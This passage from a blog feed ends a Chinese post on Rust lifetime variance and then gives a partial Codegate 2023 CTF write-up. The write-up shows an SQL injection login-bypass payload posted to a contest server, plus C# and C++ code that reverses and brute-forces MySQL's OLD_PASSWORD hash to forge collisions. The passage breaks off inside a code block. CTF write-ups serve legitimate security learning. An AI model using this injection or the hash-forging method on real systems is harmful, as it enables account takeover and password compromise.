class="keyword">fn</span> <span class="title function_">longer</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>&gt;(s1: &amp;<span class="symbol">&#x27;a</span> <span class="type">str</span>, s2: &amp;<span class="symbol">&#x27;b</span> <span class="type">str</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="type">str</span> <span class="keyword">where</span> <span class="symbol">&#x27;a</span>:<span class="symbol">&#x27;b</span>, <span class="symbol">&#x27;b</span>:<span class="symbol">&#x27;a</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> s2.<span class="title function_ invoke__">len</span>() &gt; s1.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        s2</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是对x和y分别绑定的值，其生命周期’a与’b有{‘a≼’b,’b≼’a}，也就是{‘a:’b, ‘b:’a}（显然可以推出’a&#x3D;&#x3D;’b）。<br>因此在手动指定后，在需要用到生命周期的地方，这两个参数以及返回值的生命周期就可以被推导啦：为了让他们相等，编译器要根据基本法把长的生命周期cast到短的上。<br>最终效果就是取传参生命周期较短者。注意这时我们在谈论的是参数，不是整个函数发生了什么质变。<br>……是的，其实日常根本就没有多少情况需要你操心函数参数的那个contravariant！可以松口气了。<br>当然，根据上文所述，这样<strong>推导出来的生命周期约束是怎么严格怎么来</strong>，但记住：<strong>如果你被搞晕了，那就相信你的直觉；程序是人设计为人服务的，因此绝大部分情况下生命周期的限制是符合直觉的</strong>（也就是你可以使用“显然”这一词）。<br>What a relief.</p><hr><p>有没有想过一些运算过后，偏序关系不一定会保留&#x2F;颠倒，还有可能会直接丢失！<br>那么对这种情况，非常推荐阅读关于subtyping, <strong>variance(covariant, invariant, contravariant)</strong> 的参考资料：<br><a href="https://doc.rust-lang.org/nomicon/subtyping.html">Subtyping and Variance - The Rustonomicon</a><br>我将文中的表格附在此处：</p><table><thead><tr><th>Type</th><th>‘a T</th><th>U</th></tr></thead><tbody><tr><td>&amp;’a T</td><td>covariant</td><td>covariant</td></tr><tr><td>&amp;’a mut T</td><td>covariant</td><td><em>invariant</em></td></tr><tr><td>Box<T></T></td><td></td><td>covariant</td></tr><tr><td>Vec<T></T></td><td></td><td>covariant</td></tr><tr><td>UnsafeCell<T></T></td><td></td><td><em>invariant</em></td></tr><tr><td>Cell<T></T></td><td></td><td><em>invariant</em></td></tr><tr><td>fn(T) -&gt; U</td><td><strong>contravariant</strong></td><td>covariant</td></tr><tr><td>*const T</td><td>covariant</td><td></td></tr><tr><td>*mut T</td><td><em>invariant</em></td><td></td></tr></tbody></table><p>然后你会发现倒过来（contravariant, 逆变）的其实<strong>就只有</strong>这个函数参数。<br>然后你还会注意到，那些invariant的不变量是不是都提供内部不变性，换言之，本质上都是一种指针？<br><strong>我可以提供一个绝妙的角度：想想C&#x2F;C++的指针类型定义, 指针本身是不是const，这和指针的内容（指向的对象）是不是const有啥关系吗？当然没有！</strong><br>所以某种意义上，<strong>你可以把const理解为很粗糙的生命周期约束，我们Rust更精细的系统里，他叫<code>&#39;static</code>.</strong></p>]]></content>
      
      
      <categories>
          
          <category> Programming Languages </category>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Lifetime </tag>
            
            <tag> Code </tag>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codegate 2023 Partial Write-Up (Web/Misc)</title>
      <link href="/2023/08/29/CODEGATE2023/"/>
      <url>/2023/08/29/CODEGATE2023/</url>
      
        <content type="html"><![CDATA[<h1 id="Codegate-2023-部分Write-Up-Web-Misc"><a href="#Codegate-2023-部分Write-Up-Web-Misc" class="headerlink" title="Codegate 2023 部分Write-Up (Web&#x2F;Misc)"></a>Codegate 2023 部分Write-Up (Web&#x2F;Misc)</h1><p>这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记&#x2F;照片另开一文。  </p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>没咋看。似乎是XSS绕绕。</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>是的，这题就叫Pwn（与之相对的是Pwn分类里有道题叫Web）<br>解法：没咋看。应该是比较水的一题。经典数组绕过  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;username[0]=\\&#x27; union select password from USER WHERE username=&#x27;admin&#x27; -- &amp;username[1]=2&amp;password=3&quot;</span></span><br><span class="line">r = requests.post(<span class="string">&quot;http://3.35.198.7:2929/login&quot;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="Cha’s-magic"><a href="#Cha’s-magic" class="headerlink" title="Cha’s magic"></a>Cha’s magic</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">function hashPasswordOld($password_to_hash)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $dbname, $username, $password, $charset;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = new PDO(<span class="string">&quot;mysql:host=$host;dbname=$dbname;charset=$charset&quot;</span>, $username, $password);</span><br><span class="line"></span><br><span class="line">        $query = $db-&gt;prepare(<span class="string">&quot;SELECT OLD_PASSWORD(:password)&quot;</span>);</span><br><span class="line">        $query-&gt;execute([<span class="string">&#x27;:password&#x27;</span> =&gt; $password_to_hash]);</span><br><span class="line"></span><br><span class="line">        $row = $query-&gt;fetch(PDO::FETCH_NUM);</span><br><span class="line">        <span class="keyword">if</span> ($row)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> $row[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch(PDOException $ex)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;An Error occured!&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&quot;v1&quot;</span>]) &amp;&amp; isset($_GET[<span class="string">&quot;v2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&quot;v1&quot;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&quot;v2&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (substr($v1, <span class="number">0</span>, <span class="number">13</span>) !== <span class="string">&quot;codegate2023&#123;&quot;</span> || substr($v1, -<span class="number">11</span>) !== <span class="string">&quot;i_love_you&#125;&quot;</span> ||</span><br><span class="line">        substr($v2, <span class="number">0</span>, <span class="number">13</span>) !== <span class="string">&quot;codegate2023&#123;&quot;</span> || substr($v2, -<span class="number">11</span>) !== <span class="string">&quot;i_love_you&#125;&quot;</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;fall in love~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($v1 == $v2) die(<span class="string">&quot;are you kidding me?&quot;</span>);</span><br><span class="line"></span><br><span class="line">    $v1 = hashPasswordOld($v1);</span><br><span class="line">    $v2 = hashPasswordOld($v2);</span><br><span class="line">    $v3 = hashPasswordOld($flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($v3 !== <span class="string">&quot;6368616368613230&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;flag verification failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($v1 == null <span class="keyword">or</span> $v2 == null)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;What the hell here?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($v1 == $v2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($v2 == $v3)</span><br><span class="line">        &#123;</span><br><span class="line">            die($flag);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        die(substr($flag, <span class="number">0</span>, strlen($flag) / <span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    die(<span class="string">&quot;Try harder...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>也就是v1和v2和v3经过hash得到的值都一样才能拿到完整flag。<br>对于OLD_PASSWORD的算法，网上有很多实现，这里有一个C#版本的：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Online C# Editor for free</span></span><br><span class="line"><span class="comment">// Write, Edit and Run your C# code using C# Online Compiler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HelloWorld</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">mysql_old_password</span>(<span class="params"><span class="built_in">string</span> sPassword</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    UInt32[] result = <span class="keyword">new</span> UInt32[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">bool</span> bDebug = <span class="literal">false</span>;</span><br><span class="line">    UInt32 nr = (UInt32)<span class="number">1345345333</span>, <span class="keyword">add</span> = (UInt32)<span class="number">7</span>, nr2 = (UInt32)<span class="number">0x12345671</span>;</span><br><span class="line">    UInt32 tmp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">char</span> [] password = sPassword.ToCharArray();</span><br><span class="line">    <span class="built_in">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sPassword.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (password[i] == <span class="string">&#x27; &#x27;</span> || password[i] == <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        tmp = (UInt32)password[i];</span><br><span class="line">        nr ^= (((nr &amp; <span class="number">63</span>) + <span class="keyword">add</span>) * tmp) + (nr &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        nr2 += (nr2 &lt;&lt; <span class="number">8</span> ) ^ nr;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">        Console.WriteLine(nr.ToString(<span class="string">&quot;X&quot;</span>));</span><br><span class="line">        Console.WriteLine(nr2.ToString(<span class="string">&quot;X&quot;</span>));</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">        <span class="keyword">add</span> += tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UInt32 mask = (((UInt32)<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - (UInt32)<span class="number">1</span>); <span class="comment">// 111....11, 31bits</span></span><br><span class="line">    result[<span class="number">0</span>] = nr &amp; mask;</span><br><span class="line">    result[<span class="number">1</span>] = nr2 &amp; mask;</span><br><span class="line">    <span class="built_in">string</span> hash = String.Format(<span class="string">&quot;&#123;0:X&#125;&#123;1:X&#125;&quot;</span>, result[<span class="number">0</span>], result[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> hash.ToLower();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine (mysql_old_password(<span class="string">&quot;aaaaa&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，v1和v2的hash值碰撞只需要加入空格就可以：因为该算法完全忽略空格和制表符。<br>这样前一半flag就知道了：<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP</code><br>核心问题在于使v2的hash值等于<code>6368616368613230</code>，v2必须以<code>i_love_you&#125;</code>结尾，我们唯一能改变的就是中间的字符串。<br>经过搜寻，找到一个帖子：<a href="https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis">mysql-old-password-cryptanalysis</a><br>里面给出了一段逆向推导nr与nr2的代码，以及一篇分析该算法的论文：F. Muller and T. Peyrin “Cryptanalysis of T-Function-Based Hash Functions” in International Conference on Information Security and Cryptology - ICISC 2006<br>不过需要注意的是该论文中的算法和实际算法有一个微小差异：nr2对应公式的<code>=</code>应为<code>+=</code>。<br>逆向计算nr&#x2F;nr2：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre</span><span class="params">(<span class="type">int</span> level = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; level; i++)</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;-&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bruteforce</span><span class="params">(<span class="type">uint32_t</span> pnr, <span class="type">uint32_t</span> pnr2, <span class="type">uint32_t</span> add, <span class="type">unsigned</span> len, <span class="comment">/*debug only!*/</span> <span class="type">unsigned</span> level = <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> charset[] = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span>; <span class="comment">// sorted by ascii</span></span><br><span class="line"><span class="comment">//这里的代码假设只有以上字符存在，事实上完全没有必要：ascii 32-127都可以。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">oldpw_rev</span><span class="params">(<span class="type">uint32_t</span> pnr, <span class="type">uint32_t</span> pnr2, <span class="type">uint32_t</span> add,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="type">unsigned</span> <span class="type">char</span> c, <span class="type">unsigned</span> len, <span class="comment">/*debug only!*/</span> <span class="type">unsigned</span> level = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> nr, nr2;</span><br><span class="line">    <span class="type">uint32_t</span> u, e, y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span> &amp;&amp; add==<span class="number">7</span> &amp;&amp; pnr2==<span class="number">0x12345671</span>) <span class="comment">// Modify to target value when MiM-ing</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nr = pnr;</span><br><span class="line">    nr2 = pnr2;</span><br><span class="line">    <span class="comment">// c = cc[len - 1];</span></span><br><span class="line">    add -= c;</span><br><span class="line"></span><br><span class="line">    u = nr2 - nr;</span><br><span class="line">    u = nr2 - ((u &lt;&lt; <span class="number">8</span>) ^ nr);</span><br><span class="line">    u = nr2 - ((u &lt;&lt; <span class="number">8</span>) ^ nr);</span><br><span class="line">    nr2 = nr2 - ((u &lt;&lt; <span class="number">8</span>) ^ nr);</span><br><span class="line">    nr2 &amp;= <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    y = nr;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="number">0</span>; e &lt; <span class="number">64</span>; e++)</span><br><span class="line">    &#123; <span class="comment">// guess 6 lsb of nr</span></span><br><span class="line">        <span class="type">uint32_t</span> z, g;</span><br><span class="line"></span><br><span class="line">        z = (e + add) * c;</span><br><span class="line">        g = (e ^ z) &amp; <span class="number">0x3F</span>;</span><br><span class="line">        <span class="keyword">if</span> (g == (y &amp; <span class="number">0x3F</span>))</span><br><span class="line">        &#123; <span class="comment">// must matches, otherwise reject it</span></span><br><span class="line">            <span class="type">uint32_t</span> x;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Now 8 LSB of nr known, byte-by-byte derive previous nr</span></span><br><span class="line">            x = e;</span><br><span class="line">            x = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            x = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            x = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            nr = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            nr &amp;= <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">bruteforce</span>(nr, nr2, add, len - <span class="number">1</span>, level + <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;assume:&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bruteforce</span><span class="params">(<span class="type">uint32_t</span> pnr, <span class="type">uint32_t</span> pnr2, <span class="type">uint32_t</span> add, <span class="type">unsigned</span> len, <span class="comment">/*debug only!*/</span> <span class="type">unsigned</span> level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (add<span class="number">-7</span>&lt;<span class="number">48</span>*len||add<span class="number">-7</span>&gt;<span class="number">122</span>*len) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> _=<span class="number">0</span>;_&lt;<span class="number">63</span>;_++) &#123;</span><br><span class="line">        <span class="comment">// Maybe剪枝here</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">oldpw_rev</span>(pnr,pnr2,add,charset[_],len,level)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">pre</span>(level);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;nr:%x   nr2:%x\n&quot;</span>, pnr, pnr2);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//eg: aaaa</span></span><br><span class="line">    <span class="type">uint32_t</span> pnr = <span class="number">0xA8D6917A</span>, pnr2 = <span class="number">0x6FAB63E5</span>; <span class="comment">//最终的nr, nr2，来自上文的C#代码</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">bruteforce</span>(pnr, pnr2, <span class="number">97</span>*<span class="number">4</span> + <span class="number">7</span> <span class="comment">/*add*/</span>, <span class="number">4</span><span class="comment">/*length*/</span>) &lt;&lt; endl; <span class="comment">// ! initial value of add is 7</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是，在已知add值（字符串的前缀ASCII和）以及当前字符的情况下，对于平凡情况（无多解），能在常数时间确定上一个nr&#x2F;nr2对的值。<br>一个朴素的思路是暴力枚举当前位的字符与add值。<br>暴力计算的话时间复杂度肯定是无法接受的（O(64^n)，5步需要约1分钟）。我们理一下现在已知什么，需要求解什么。请注意：我们需要的只是hash碰撞，不代表flag也是以<code>i_love_you&#125;</code>结尾的。</p><ul><li>v2的形式：<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code></li><li>FLAG的总长度为78-79（因为前一半flag长为39）</li><li>最终hash(v2)&#x3D;<code>6368616368613230</code> -&gt; 最终的nr&#x2F;nr2</li><li>前一半flag的add值为3430：<code>sum([ord(i) for i in &quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&quot;])</code></li><li>结尾的11个字符<code>i_love_you&#125;</code>对应add值：1207</li><li>未知：整个flag字符串的add值<ul><li>但add值的可能范围很有限，我们可以容易计算出上下界：下界为3430+39*32&#x3D;4678，上界为3430+40*127&#x3D;8510</li><li><strong>并且，这个范围内合法的add值占比并不高：对于一个可能的add值，往回推结尾的那11个字符<code>i_love_you&#125;</code>必须都有解</strong></li></ul></li></ul><p>所以我们只需要MitM，中间相遇，即可爆出正解。<br>这个中间状态指的是<code>&lt;???&gt;</code>这串未知字串中间某个位置一个独特的nr&#x2F;nr2&#x2F;add对；而这个add值毕竟只是一个中间量（<strong>下称fadd</strong>），可以手动给予一个值。在本题中我们手动要求从<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code>再向前填充总计<code>6*127</code>的字符作为中间相遇处：当然越大的值搜索空间越大。  </p><ol><li>我们先筛选出可行的add值，并记录在处理<code>i_love_you&#125;</code>前的中间add值</li><li>逆向: 对于每个中间add值先逆推5步，记录所有可能在中间相遇处add值为fadd的nr&#x2F;nr2对，以及逆向对应的5个字符</li><li>正向: 我们手动要求向前数步（至少6步，因为fadd值是3430+6*127）到达中间相遇处使得add值为fadd，并检查这个nr&#x2F;nr2对是否出现在逆向得到的结果中；如果有，则拿下。<br>爆破代码：Credit to @4qwerty<br>为什么for嵌套这么多？因为4老师懒得写递归，反正没几步，不够就加一层for就行了。<br>其实如果要计算的话是可以的：逆着5步大约有<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span 